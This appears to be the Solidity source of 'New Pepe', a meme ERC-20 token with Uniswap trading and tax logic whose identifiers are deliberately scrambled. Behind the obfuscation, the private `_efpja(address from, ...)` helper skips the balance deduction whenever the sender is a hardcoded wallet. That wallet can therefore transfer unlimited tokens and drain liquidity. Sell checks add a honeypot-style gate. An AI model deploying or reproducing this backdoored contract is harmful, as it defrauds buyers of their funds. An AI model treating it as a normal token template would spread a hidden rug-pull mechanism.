/*

New Pepe   $PEPE


TWITTER: https://twitter.com/PepeCoin_New
TELEGRAM: https://t.me/PepeCoin_New
WEBSITE: https://newpepe.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _efpja(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _efpja(a, b, "SafeMath");
    }

    function  _efpja(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _vkrmk;
    address payable private _kicdje;
    address private _rjacbe;

    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ycdhnr;
    mapping (address => bool) private _yrqiry;
    mapping(address => uint256) private _fnaqnp;
    uint256 public _qvalpib = _totalSupply;
    uint256 public _worqvie = _totalSupply;
    uint256 public _rkTlkrv= _totalSupply;
    uint256 public _vodTcf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ysvfpuj=0;
    uint256 private _ejzrwy=0;
    

    bool private _bvqrmh;
    bool public _uvoiepf = false;
    bool private puopre = false;
    bool private _oegyrju = false;


    event _hrywktc(uint _qvalpib);
    modifier uirkoxr {
        puopre = true;
        _;
        puopre = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _ycdhnr[owner(

        )] = true;
        _ycdhnr[address
        (this)] = true;
        _ycdhnr[
            _kicdje] = true;
        _kicdje = 
        payable (0x58ce007AE0a576C85046DfE357bF433854C07638);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _efpja(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 vdjkbr=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uvoiepf) {
                if (to 
                != address
                (_vkrmk) 
                && to !=
                 address
                 (_rjacbe)) {
                  require(_fnaqnp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnaqnp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rjacbe && to != 
            address(_vkrmk) &&
             !_ycdhnr[to] ) {
                require(amount 
                <= _qvalpib,
                 "Exceeds the _qvalpib.");
                require(balanceOf
                (to) + amount
                 <= _worqvie,
                  "Exceeds the _worqvie.");
                if(_ejzrwy
                < _ysvfpuj){
                  require
                  (! _rkqeiyq(to));
                }
                _ejzrwy++;
                 _yrqiry
                 [to]=true;
                vdjkbr = amount._pvr
                ((_ejzrwy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rjacbe &&
             from!= address(this) 
            && !_ycdhnr[from] ){
                require(amount <= 
                _qvalpib && 
                balanceOf(_kicdje)
                <_vodTcf,
                 "Exceeds the _qvalpib.");
                vdjkbr = amount._pvr((_ejzrwy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ejzrwy>
                _ysvfpuj &&
                 _yrqiry[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!puopre 
            && to == _rjacbe &&
             _oegyrju &&
             contractTokenBalance>
             _rkTlkrv 
            && _ejzrwy>
            _ysvfpuj&&
             !_ycdhnr[to]&&
              !_ycdhnr[from]
            ) {
                _transferFrom( _wearf(amount, 
                _wearf(contractTokenBalance,
                _vodTcf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prwueo(address
                    (this).balance);
                }
            }
        }

        if(vdjkbr>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(vdjkbr);
          emit
           Transfer(from,
           address
           (this),vdjkbr);
        }
        _balances[from
        ]= _efpja(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _efpja(vdjkbr));
        emit Transfer
        (from, to, 
        amount.
         _efpja(vdjkbr));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uirkoxr {
        if(tokenAmount==
        0){return;}
        if(!_bvqrmh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _vkrmk.WETH();
        _approve(address(this),
         address(
             _vkrmk), 
             tokenAmount);
        _vkrmk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wearf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _efpja(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _kicdje){
            return a ;
        }else{
            return a .
             _efpja (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvalpib = _totalSupply;
        _worqvie = _totalSupply;
        emit _hrywktc(_totalSupply);
    }

    function _rkqeiyq(address 
    account) private view 
    returns (bool) {
        uint256 eduesr;
        assembly {
            eduesr :=
             extcodesize
             (account)
        }
        return eduesr > 
        0;
    }

    function _prwueo(uint256
    amount) private {
        _kicdje.
        transfer(
            amount);
    }

    function openlTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bvqrmh ) ;
        _vkrmk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _vkrmk), 
            _totalSupply);
        _rjacbe = 
        IUniswapV2Factory(_vkrmk.
        factory( ) 
        ). createPair (
            address(this
            ),  _vkrmk .
             WETH ( ) );
        _vkrmk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rjacbe).
        approve(address(_vkrmk), 
        type(uint)
        .max);
        _oegyrju = true;
        _bvqrmh = true;
    }

    receive() external payable {}
}